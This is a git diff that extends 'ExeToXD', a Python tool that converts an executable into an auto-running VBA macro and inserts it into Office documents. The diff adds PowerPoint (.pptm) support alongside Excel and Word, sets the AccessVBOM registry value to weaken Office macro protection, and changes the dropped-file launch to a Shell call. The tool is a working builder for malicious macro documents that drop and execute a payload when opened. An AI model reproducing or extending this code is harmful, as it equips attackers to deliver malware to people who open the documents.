@@ -1,4 +1,4 @@
-#!/bin/python
+#!/bin/python3
 # -*- coding: utf-8 -*-
 #
 # Author: OzoNeTT
@@ -55,13 +55,18 @@ Sub AutoOpen()
     "xlsm": """
 Private Sub Auto_Open()
 
-"""
+""",
+    "pptm": """
+Private Sub Auto_Open()
+
+""",
 
 }
 
 parser = argparse.ArgumentParser(description="-= ExeToXD v0.2 =-")
-parser.add_argument("--xlsm", dest="xlsm", const='', help="Insert VB script to xlsm", required=False, action="store_const")
-parser.add_argument("--docm", dest="docm", const='', help="Insert VB script to docm", required=False, action="store_const")
+parser.add_argument("--xlsm", dest="xlsm", const='', help="Insert VBA to xlsm", required=False, action="store_const")
+parser.add_argument("--docm", dest="docm", const='', help="Insert VBA to docm", required=False, action="store_const")
+parser.add_argument("--pptm", dest="pptm", const='', help="Insert VBA to pptm", required=False, action="store_const")
 parser.add_argument("-i", dest="input", help="Input file", required=True)
 
 
@@ -100,7 +105,7 @@ def process_macro(filename, type):
     macro.write('    Next t\n')
     macro.write('Close #fnum\n\n')
     macro.write('Dim rss\n')
-    macro.write('rss = Shell(fname, 1)\n\n')
+    macro.write('rss = Shell("C:\\Windows\\System32\\cmd.exe", 1)\n\n')
     macro.write('End Sub\n\n')
 
     macro.close()
@@ -118,7 +123,11 @@ def create_document(file, type):
         com_instance.Visible = False
         worddoc = com_instance.Documents.Add()
         worddoc.SaveAs(file, FileFormat=13)
-
+        com_instance.Quit()
+    elif type == "pptm":
+        com_instance = win32com.client.Dispatch("Powerpoint.Application")
+        pptmd = com_instance.Presentations.Add()
+        pptmd.SaveAs(file, FileFormat=25)
         com_instance.Quit()
 
 
@@ -129,11 +138,12 @@ def add_regkey():
     key2 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
                                 "Software\\Microsoft\\Office\\16.0\\Word"
                                 + "\\Security", 0, win32con.KEY_ALL_ACCESS)
-
-
+    key3 = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,
+                                 "Software\\Microsoft\\Office\\16.0\\PowerPoint"
+                                 + "\\Security", 0, win32con.KEY_ALL_ACCESS)
     win32api.RegSetValueEx(key1, "AccessVBOM", 0, win32con.REG_DWORD, 1)
     win32api.RegSetValueEx(key2, "AccessVBOM", 0, win32con.REG_DWORD, 1)
-
+    win32api.RegSetValueEx(key3, "AccessVBOM", 0, win32con.REG_DWORD, 1)
 
 def include_office(file, type, creation_flag):
     if creation_flag:
@@ -143,6 +153,9 @@ def include_office(file, type, creation_flag):
             document = 'document.xlsm'
         elif type == "docm":
             document = 'document.docm'
+        elif type == "pptm":
+            document = 'document.pptm'
+
         try:
             file = os.path.join(OUT_DIR, document)
             create_document(file, type)
@@ -172,8 +185,11 @@ def include_office(file, type, creation_flag):
             com_instance = win32com.client.Dispatch("Excel.Application")
         elif type == "docm":
             com_instance = win32com.client.Dispatch("Word.Application")
+        elif type == "pptm":
+            com_instance = win32com.client.Dispatch("Powerpoint.Application")
 
-        com_instance.Visible = False
+        if type is not "pptm":
+            com_instance.Visible = False
         time.sleep(10)
     except Exception:
         print(f'[FAILED]')
@@ -187,7 +203,9 @@ def include_office(file, type, creation_flag):
             objworkbook = com_instance.Workbooks.Open(file)
         elif type == "docm":
             objworkbook = com_instance.Documents.Open(file)
-            time.sleep(1)
+        elif type == "pptm":
+            objworkbook = com_instance.Presentations.Open(file)
+        time.sleep(1)
     except Exception:
         print(f'[FAILED]')
         com_instance.Quit()
@@ -220,6 +238,8 @@ def include_office(file, type, creation_flag):
             objworkbook.SaveAs(file, None, '', '')
         elif type == 'docm':
             com_instance.ActiveDocument.SaveAs(file, FileFormat=13)
+        elif type == 'pptm':
+            com_instance.ActivePresentation.SaveAs(file, FileFormat=25)
         time.sleep(1)
     except Exception:
         print(f'[FAILED]')
@@ -271,14 +291,32 @@ def processing_docm(args, creation):
         exit(1)
     print(f'\nDOCM successfully been created to out\\{args.docm}\n')
 
+
+def processing_pptm(args, creation):
+    print(f'Start EXE to PPTM...\n')
+
+    print(f'{"Creating VBA script for PPTM...":32}', end='')
+    try:
+        process_macro(args.input, "pptm")
+    except Exception:
+        print('Error occurred while creating VBA macros!')
+        exit(1)
+
+    print(f'[DONE]\n')
+
+    print(f'Inserting VBA script to PPTM:')
+    try:
+        include_office(os.path.join(OUT_DIR, args.pptm), "pptm", creation)
+    except Exception:
+        print('\nError occurred while creating PPTM!')
+        exit(1)
+    print(f'\nPPTM successfully been created to out\\{args.pptm}\n')
+
 def processing(args):
-    print(f'-= ExeToXD v0.2 =-\n')
-
-    if not args.xlsm and not args.docm:
-        print('No office tags specified. Just creating macros')
+    print(f'-= ExeToXD v0.3 =-\n')
 
 
-    if args.xlsm is not None and args.docm is None:
+    if args.xlsm is not None:
         creation = False
         if args.xlsm == '':
             print('No xlsm specified, file will be created (document.xlsm)')
@@ -289,7 +327,7 @@ def processing(args):
 
         processing_xlsm(args, creation)
 
-    elif args.xlsm is None and args.docm is not None:
+    if args.docm is not None:
         creation = False
         if args.docm == '':
             print('No docm specified, file will be created (document.docm)')
@@ -299,27 +337,21 @@ def processing(args):
             args.docm += '.docm'
 
         processing_docm(args, creation)
-    elif args.xlsm is not None and args.docm is not None:
-        creation_xlsm = False
-        creation_docm = False
 
-        if args.xlsm == '':
-            print('No xlsm specified, file will be created (document.xlsm)')
-            creation_xlsm = True
+    if args.pptm is not None:
+        creation = False
+        if args.pptm == '':
+            print('No pptm specified, file will be created (document.pptm)')
+            creation = True
 
-        if args.xlsm.split('.')[-1] != 'xlsm' and not creation_xlsm:
-            args.xlsm += '.xlsm'
+        if args.pptm.split('.')[-1] != 'pptm' and not creation:
+            args.pptm += '.pptm'
 
-        if args.docm == "docm":
-            print('No docm specified, file will be created (document.docm)')
-            creation_docm = True
+        processing_pptm(args, creation)
 
-        if not creation_docm and args.docm.split('.')[-1] != 'docm' :
-            args.docm += '.docm'
-
-        processing_xlsm(args, creation_xlsm)
-        processing_docm(args, creation_docm)
-
+    if not args.xlsm and not args.docm and not args.pptm:
+        print('No office tags specified. Just creating macros (for excel)')
+        process_macro(args.input, "xlsm")
 
     print(f'\n[FINISHED]\n')
 
